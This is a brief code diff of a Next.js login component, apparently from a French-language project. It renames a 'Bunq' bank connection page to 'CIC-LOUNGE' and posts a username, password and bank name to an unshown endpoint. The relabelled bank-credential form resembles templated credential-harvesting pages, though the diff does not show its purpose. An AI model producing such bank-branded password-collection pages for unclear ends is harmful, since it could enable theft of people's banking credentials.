@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function BunqConnect() {
+export default function CICLOUNGEConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function BunqConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "BUNQ" // Ajout explicite du nom de la banque ici
+          bankName: "CIC-LOUNGE" // Ajout explicite du nom de la banque ici
         }),
       });
 
